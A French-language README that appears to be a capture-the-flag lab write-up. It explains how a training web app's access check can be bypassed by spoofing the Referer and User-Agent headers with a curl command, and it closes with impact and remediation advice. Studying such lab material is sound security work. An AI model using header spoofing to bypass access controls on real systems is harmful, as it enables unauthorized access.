# README : Modification du header de la requete

## Description

Cette brèche met en évidence une vulnérabilité dans la gestion des informations dans l'en-tête de la requete HTTP d'une application web. Elle permet à un attaquant potentiel de modifier les métadonnées de la requete pour contourner une restriction de sécurité.

## Fonctionnement

- Accédez à la page : `http://X.X.X.X/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f`
- Observez les commentaires dans le code HTML :

```HTML
<!--You must come from : "https://www.nsa.gov/".-->
<!--Let's use this browser : "ft_bornToSec". It will help you a lot.-->
```

- Utilisez une commande curl ou un outil comme Insomnia pour modifier les en-têtes de la requete :

```shell
curl --request GET --url 'http://X.X.X.X/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f'
 --header 'Referer: https://www.nsa.gov/'
 --header 'User-Agent: ft_bornToSec' | grep 'flag'
```

- Recherchez le flag dans la reponse

## Impact

Cette vulnérabilité peut permettre à un attaquant de :

- Contourner les restrictions de sécurité basées sur l'origine de la requete
- Utiliser des identifiants d'utilisateur malveillants pour accéder à l'application
- Potentiellement exposer des informations sensibles

## Recommandations

Pour corriger cette vulnérabilité :

- Valider et sécuriser toutes les entrées utilisateur côté serveur avant de les utiliser ou de les stocker.
- Implémenter une validation robuste pour les en-têtes de la requete HTTP.
- Utiliser des méthodes d'authentification plus sécurisées que les métadonnées de la requete.
- Limiter l'accès à des informations sensibles basé sur l'origine de la reque
